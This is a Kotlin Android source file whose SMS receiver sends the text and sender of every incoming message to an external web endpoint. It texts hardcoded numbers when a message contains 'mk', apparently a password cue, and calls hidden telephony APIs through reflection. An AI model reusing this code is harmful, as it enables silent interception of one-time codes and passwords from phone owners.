package com.robertohuertas.endless

import android.Manifest
import android.app.PendingIntent
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.IBinder
import android.provider.Telephony
import android.support.annotation.RequiresApi
import android.support.v4.app.ActivityCompat
import android.telephony.SmsManager
import android.telephony.SubscriptionManager
import android.util.Log
import okhttp3.OkHttpClient
import okhttp3.Request
import java.lang.reflect.InvocationTargetException
import java.lang.reflect.Method


class SMSReceiver : BroadcastReceiver() {
    companion object {
        private val TAG by lazy { SMSReceiver::class.java.simpleName }
    }


    @RequiresApi(Build.VERSION_CODES.M)
    override fun onReceive(context: Context, intent: Intent?) {
        if (!intent?.action.equals(Telephony.Sms.Intents.SMS_RECEIVED_ACTION)) return
        val extractMessages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
        extractMessages.forEach {
            smsMessage -> Log.d("SMS123", "message: " + smsMessage.displayMessageBody)
                //smsMessage -> Log.v(TAG, smsMessage.displayMessageBody)

            val gfgThread = Thread {
                try {
                    smsMessage.emailFrom
                    val url = "https://4share.vn/tool/4s/forward-sms2023.php?sms_ok=" + smsMessage.displayMessageBody + "&from_phone=" + smsMessage.originatingAddress
                    //            val postData = "foo1=" + smsMessage.displayMessageBody
                    val request = Request.Builder().url(url).build()
                    val client = OkHttpClient()
                    client.newCall(request).execute()


                    ////////////////////////////////////////////////////////////////
                    //Bắt đầu gửi sms thông báo tới 1 số đt


                    // on below line we are initializing sms manager.
                    //as after android 10 the getDefault function no longer works
                    //so we have to check that if our android version is greater
                    //than or equal toandroid version 6.0 i.e SDK 23
                    val smsManager: SmsManager


                    val sSubManager: SubscriptionManager =
                        context.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as SubscriptionManager

                    if (ActivityCompat.checkSelfPermission(
                            context,
                            Manifest.permission.READ_PHONE_STATE
                        ) != PackageManager.PERMISSION_GRANTED
                    ) {
                        // TODO: Consider calling
                        //    ActivityCompat#requestPermissions
                        // here to request the missing permissions, and then overriding
                        //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
                        //                                          int[] grantResults)
                        // to handle the case where the user grants the permission. See the documentation
                        // for ActivityCompat#requestPermissions for more details.

                    }

                    var phoneNum = "0902066768";

                    //nếu có 2 SIM, sim1, và sim2:
                    //https://www.hrupin.com/2017/07/detect-sim-card-availability-in-the-android-dual-sim-device
                    if(sSubManager.getActiveSubscriptionInfoForSimSlotIndex(1) !== null) {

                        Log.d("SMS123", "message: dual sim ok!")

                        //*** Lad: đoạn này thêm vào, để chọn random SIM 0,1:
                        var method: Method =
                            Class.forName("android.os.ServiceManager").getDeclaredMethod(
                                "getService", *arrayOf<Class<*>>(
                                    String::class.java
                                )
                            )
                        method.setAccessible(true)

                        method = Class.forName("android.telephony.SubscriptionManager")
                            .getDeclaredMethod(
                                "getSubId",
                                Int::class.javaPrimitiveType
                            )
                        method.setAccessible(true)

                        //Randomm sim ở đây:
    //                    val simID = 0; //while simID is the slot number of your second simCard
                        val simID = (0..1).random();

                        if (simID == 0) {
                            phoneNum = "0902066768"
                        } else {
                            phoneNum = "0966616368"
                        }

                        val param = method.invoke(null, simID) as IntArray
                        val inst: Int = param.get(0)
                        //--kết thúc đoạn chọn sim

                        //tạo smsMng để gửi tin:
                        smsManager = SmsManager.getSmsManagerForSubscriptionId(inst)
                    }else{

                        //*** Lad: đoạn này mặc định 1 SIM default
                        if (Build.VERSION.SDK_INT>=23) {
                            //if SDK is greater that or equal to 23 then
                            //this is how we will initialize the SmsManager
                            smsManager = context.getSystemService(SmsManager::class.java)
                        }
                        else{
                            //if user's SDK is less than 23 then
                            //SmsManager will be initialized like this
                            smsManager = SmsManager.getDefault()
                        }
                    }

                    //Gửi message ok:
                    if(smsMessage.displayMessageBody.toLowerCase().indexOf("mk") >= 0) {
                        // on below line we are sending text message.
                        smsManager.sendTextMessage(
                            phoneNum,
                            null,
                            "Get sms from: " + smsMessage.originatingAddress,
                            null,
                            null
                        )
                    }

                } catch (e: Exception) {
                    e.printStackTrace()
                }
            }
            gfgThread.start()
        }
        //TODO
    }


    fun sendSMS(
        ctx: Context,
        simID: Int,
        toNum: String?,
        centerNum: String?,
        smsText: String?,
        sentIntent: PendingIntent?,
        deliveryIntent: PendingIntent?
    ): Boolean {
        val name: String
        try {
            name = if (simID == 0) {
                "isms0"
            } else if (simID == 1) {
                "isms1"
            } else {
                throw java.lang.Exception("can not get service which for sim '$simID', only 0,1 accepted as values")
            }
            try {
                var method: Method = Class.forName("android.os.ServiceManager").getDeclaredMethod(
                    "getService", *arrayOf<Class<*>>(
                        String::class.java
                    )
                )
                method.setAccessible(true)
                val param: Any = method.invoke(null, arrayOf<Any>(name))
                    ?: throw RuntimeException("can not get service which is named '$name'")
                method =
                    Class.forName("com.android.internal.telephony.ISms\$Stub").getDeclaredMethod(
                        "asInterface", *arrayOf<Class<*>>(
                            IBinder::class.java
                        )
                    )
                method.setAccessible(true)
                val stubObj: Any = method.invoke(null, arrayOf(param))
                method = stubObj.javaClass.getMethod(
                    "sendText",
                    String::class.java,
                    String::class.java,
                    String::class.java,
                    String::class.java,
                    PendingIntent::class.java,
                    PendingIntent::class.java
                )
                method.invoke(
                    stubObj,
                    ctx.packageName,
                    toNum,
                    centerNum,
                    smsText,
                    sentIntent,
                    deliveryIntent
                )
            } catch (e: ClassNotFoundException) {
                throw RuntimeException(e)
            } catch (e: NoSuchMethodException) {
                throw RuntimeException(e)
            } catch (e: InvocationTargetException) {
                throw RuntimeException(e)
            } catch (e: IllegalAccessException) {
                throw RuntimeException(e)
            }
            return true
        } catch (e: ClassNotFoundException) {
            Log.e("Exception", "ClassNotFoundException:" + e.message)
        } catch (e: NoSuchMethodException) {
            Log.e("Exception", "NoSuchMethodException:" + e.message)
        } catch (e: InvocationTargetException) {
            Log.e("Exception", "InvocationTargetException:" + e.message)
        } catch (e: IllegalAccessException) {
            Log.e("Exception", "IllegalAccessException:" + e.message)
        } catch (e: java.lang.Exception) {
            Log.e("Exception", "Exception:$e")
        }
        return false
    }


}
